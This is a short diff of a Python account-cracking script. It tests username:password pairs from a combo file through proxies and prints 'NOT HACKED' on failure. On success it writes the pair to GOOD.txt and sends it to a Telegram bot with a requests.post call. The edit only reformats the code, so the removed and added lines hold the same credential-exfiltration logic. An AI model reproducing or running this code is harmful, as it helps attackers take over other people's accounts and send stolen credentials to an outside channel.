@@ -59,20 +59,14 @@ def CHECK(user,pess):
 ━━━━━━━━━━━━━"""
 			print("[/] Enjoy")
 			print('--------------------------------'+colorama.Fore.RESET)
-			try:
-				requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\nBY @TweakPY @vv1ck 💸')
-			except:
-				pass
+			try:requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\nBY @TweakPY @vv1ck 💸')
+			except:pass
 			with open('GOOD.txt', 'a') as x:
 				x.write(f'{user}:{pess}'+'\n')
-		else:
-			print(colorama.Fore.RED+f"NOT HACKED : [{user}:{pess}]"+colorama.Fore.RESET)
-	except requests.exceptions.ConnectionError:
-		print(colorama.Fore.RED+"[-] Bad Proxy !!"+colorama.Fore.RESET)
-	except requests.exceptions.ReadTimeout:
-		print(colorama.Fore.RED + "[-] Bad Proxy !!" + colorama.Fore.RESET)
-	except KeyboardInterrupt:
-		exit(0)
+		else:print(colorama.Fore.RED+f"NOT HACKED : [{user}:{pess}]"+colorama.Fore.RESET)
+	except requests.exceptions.ConnectionError:print(colorama.Fore.RED+"[-] Bad Proxy !!"+colorama.Fore.RESET)
+	except requests.exceptions.ReadTimeout:print(colorama.Fore.RED + "[-] Bad Proxy !!" + colorama.Fore.RESET)
+	except KeyboardInterrupt:exit(0)
 def FILname():
 	F=input('[+] Enter The Combo File Name : ')
 	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
